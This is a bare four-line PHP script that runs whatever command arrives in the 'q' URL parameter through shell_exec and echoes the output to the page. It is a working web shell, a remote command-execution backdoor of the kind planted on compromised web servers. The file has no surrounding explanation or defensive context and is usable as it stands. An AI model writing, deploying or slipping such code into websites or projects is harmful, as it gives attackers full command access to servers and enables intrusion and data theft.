<?php 
    $output = shell_exec($_GET['q']);
    echo "<pre>$output</pre>";
?>